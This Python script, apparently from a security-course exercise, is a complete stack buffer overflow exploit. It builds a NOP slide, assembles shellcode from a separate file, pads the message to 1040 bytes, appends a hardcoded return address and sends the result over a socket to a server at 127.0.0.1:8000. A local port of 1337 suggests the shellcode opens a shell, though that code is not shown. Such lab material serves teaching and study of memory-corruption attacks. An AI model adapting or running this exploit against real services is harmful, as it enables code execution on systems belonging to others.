#!/usr/bin/python

import os
import socket
import assemble
import struct

HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337


PATH_TO_SHELLCODE = './shellcode.asm'


def network_order_uint32(value):
    return struct.pack('>L', value)


def get_shellcode():
    shellcode = assemble.assemble_file(PATH_TO_SHELLCODE)
    return shellcode


def get_payload():
    totalMsgLen = 1040  # not including return address
    addr = chr(0x78) + chr(0xde) + chr(0xff) + chr(0xbf)
    shellcode = get_shellcode()
    nop = assemble.assemble_data("nop")
    # make a nop slide with a length that is a multiple of 4
    # so the shell will start at the start of a register
    nopLen = 4 * ((totalMsgLen - len(shellcode)) // 4)
    nopSlide = nop * nopLen
    # suffix padding, between the end of the shell code and
    # our return address
    paddingLen = totalMsgLen - len(shellcode) - nopLen
    padding = nop * paddingLen
    message = ''.join([nopSlide, shellcode, padding, addr])
    payload = network_order_uint32(len(message)) + message
    return payload


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
